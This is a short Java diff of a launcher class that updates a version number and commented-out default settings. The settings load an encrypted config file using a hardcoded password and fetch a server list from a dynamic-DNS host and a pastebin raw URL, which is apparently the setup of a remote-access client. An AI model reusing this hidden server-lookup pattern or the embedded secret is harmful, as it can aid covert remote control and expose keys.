@@ -16,7 +16,7 @@ public class Inicio {
 
     public static CFG config;
     public static Interfaz in;//instalador
-    public static String v = "2.0.2";//version
+    public static String v = "2.0.4";//version
     public static String i = "";//identificador
     public static String pCCON = "ALSKJDAO LAJSDOASL DALSKDJAOSIUD ASDA"; //password del archivo de configuracion
     private static File f;
@@ -181,12 +181,13 @@ public class Inicio {
             CLRT cl = new CLRT();
             Inicio.config = (CFG) UtilRT.leerObjeto(cl.descifrar("/cfg.dat"));
         } catch (Exception e) {
-//            //configuracion default para pruebas en dessarrollo
+            //configuracion default para pruebas en dessarrollo
 //            Inicio.config = new CFG();
 //            Inicio.config.inicializarParamertros();
 //            Inicio.config.agregarParametro("gui", Boolean.FALSE);
 //            Inicio.config.agregarParametro("dns", "localhost:4000");
 ////            Inicio.config.agregarParametro("urlDns", "http://rtdns.ddns.net/list.txt");
+////            Inicio.config.agregarParametro("urlDns", "http://rtdns.ddns.net/list.txt;https://pastebin.com/raw/PEWDszwy");
 //            Inicio.config.agregarParametro("claveClase", "");
 //            Inicio.config.agregarParametro("delay", 3000);
 //            Inicio.config.agregarParametro("prefijo", "");
